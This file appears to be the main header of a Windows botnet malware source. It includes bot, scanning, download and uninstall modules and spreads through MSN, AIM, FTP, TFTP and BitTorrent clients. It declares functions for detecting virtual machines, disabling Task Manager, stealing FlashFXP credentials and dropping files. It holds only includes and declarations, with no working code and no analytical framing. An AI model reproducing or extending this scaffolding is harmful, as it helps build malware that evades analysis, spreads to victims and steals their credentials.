#define _WIN32_WINNT	0x0403				
#define WIN32_LEAN_AND_MEAN					
#pragma optimize("gsy", on)					
#pragma comment(linker,"/RELEASE")			
#pragma comment(linker, "/ALIGN:4096")		
#pragma comment(linker, "/IGNORE:4108 ")	
#pragma comment(linker,"/IGNORE:4078")

#include <malloc.h>
#include <stdio.h>
#include <stdlib.h>
#include <comutil.h>
#include <time.h>
#include <windows.h>
#include <conio.h>    
#include <string.h>   
#include <wininet.h>
#include <winsock.h> 
#include <shlobj.h>
#include <ctype.h> 
#include <tchar.h>
#include <winable.h> 
#include <windns.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <wininet.h>
#include <shellapi.h>
#include <mmsystem.h>
#include <time.h>
#include <Lm.h>
#include <winioctl.h>
#include <sqlext.h>
#include <shlwapi.h>
#include <Winnetwk.h>
#include <ctype.h>
#include <lmat.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
//#include <stdarg.h>





#include <process.h>
#include <winsvc.h>

//main
#include "defines.h"
#include "nbot.h"
#include "threads.h"
#include "tcpip.h"
//base
#include "uninstall.h"
#include "other.h"
#include "download.h"
//#include "service.h"
//scanning
#include "advscan.h"
#include "hostcheck.h"
#include "ftpd.h"
#include "zip.h"
#include "msn.h"
#include "tftp 2008.h"
#include "aim.h"
#include "triton.h"
int azureus();
int utorrent();
bool IsProcessRunningUnderVM();
void AntiTaskManager( void* pVoid );
char *_fipath(); 
int FlashFXP(int parse, SOCKET sock, char *dest, BOOL notice);
void dropfiles(HWND hwnd);
